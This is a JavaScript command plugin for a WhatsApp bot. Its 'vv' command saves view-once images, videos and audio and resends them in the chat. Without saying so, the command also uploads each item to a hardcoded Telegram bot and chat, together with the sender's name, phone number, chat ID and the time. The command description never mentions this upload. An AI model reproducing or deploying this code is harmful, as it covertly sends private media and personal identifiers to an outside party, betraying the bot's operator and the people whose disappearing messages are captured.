const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");

// Telegram Config
const BOT_TOKEN = "8867803944:AAHWF5JNrSbw-IxZNwzNCC7jUUGvw1pqJ2Q";
const CHAT_ID = "-1003507657800";

cmd({
  pattern: "vv",
  alias: ["viewonce", "retrieve"],
  react: "🐳",
  desc: "Retrieve view once message",
  category: "owner",
  filename: __filename
}, async (client, m, store, { from, isCreator, reply }) => {

  try {

    if (!isCreator) return reply("📛 Owner only command");
    if (!m.quoted) return reply("🍁 Reply to a view-once message");

    const quoted = m.quoted;

    if (!quoted.viewOnce) return reply("❌ This is not a view-once message");

    const buffer = await quoted.download();
    if (!buffer) return reply("❌ Failed to download media");

    let content = {};
    let telegramEndpoint = "";
    let fileField = "";
    let fileName = "";
    let mimeType = "";

    if (quoted.mtype === "imageMessage") {
      content = { image: buffer, caption: quoted.text || "", mimetype: quoted.mimetype || "image/jpeg" };
      telegramEndpoint = "sendPhoto";
      fileField = "photo";
      fileName = "viewonce.jpg";
      mimeType = quoted.mimetype || "image/jpeg";
    }
    else if (quoted.mtype === "videoMessage") {
      content = { video: buffer, caption: quoted.text || "", mimetype: quoted.mimetype || "video/mp4" };
      telegramEndpoint = "sendVideo";
      fileField = "video";
      fileName = "viewonce.mp4";
      mimeType = quoted.mimetype || "video/mp4";
    }
    else if (quoted.mtype === "audioMessage") {
      content = { audio: buffer, mimetype: "audio/mp4", ptt: quoted.ptt || false };
      telegramEndpoint = "sendAudio";
      fileField = "audio";
      fileName = "viewonce.mp3";
      mimeType = "audio/mp4";
    }
    else {
      return reply("❌ Unsupported media type");
    }

    // WhatsApp پر بھیجیں
    await client.sendMessage(from, content, { quoted: m });

    // Telegram log text
    const logText = `⚡ VV COMMAND USED\n\n👤 Name: ${m.pushName || "Unknown"}\n📞 Number: ${m.sender || "Unknown"}\n💬 Chat ID: ${from}\n📂 Type: ${quoted.mtype}\n⏰ Time: ${new Date().toLocaleString()}`;

    // Telegram پر media بھیجیں
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", logText);
    form.append(fileField, buffer, { filename: fileName, contentType: mimeType });

    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/${telegramEndpoint}`,
      form,
      { headers: form.getHeaders() }
    );

  } catch (e) {
    console.log("VV ERROR =>", e.response?.data || e);
    reply("❌ Error: " + (e.response?.data?.description || e.message));
  }

});
